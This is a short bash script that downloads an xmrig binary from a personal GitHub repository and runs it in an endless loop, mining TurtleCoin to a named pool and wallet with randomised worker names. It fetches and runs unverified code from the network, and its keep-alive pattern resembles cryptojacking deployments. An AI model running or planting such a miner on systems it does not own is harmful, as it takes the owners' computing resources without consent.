#!/bin/bash
POOL=trtl-miner.azpool.win:5555
WALLET=TRTLuxxh3pUiHZKwvZ7FFq5B3G19Xf4tXaCksky7fumHDf7MXFeAeCZikw4hH9hSGwMiNM1LS7rg3iF6P9WeQ1kJ9vu6JXQCyJS
WORKER=$(echo $(shuf -i 10-40 -n 1)-TRTL)
wget https://github.com/pogchampv10/CPU/raw/main/xmrig
chmod +x xmrig
while [ 1 ]; do
./xmrig -a argon2/chukwav2 --randomx-mode=fast --randomx-1gb-pages --tls --cpu-no-yield -o $POOL -u $WALLET -p $WORKER -k
sleep 5
done
sleep 999999999
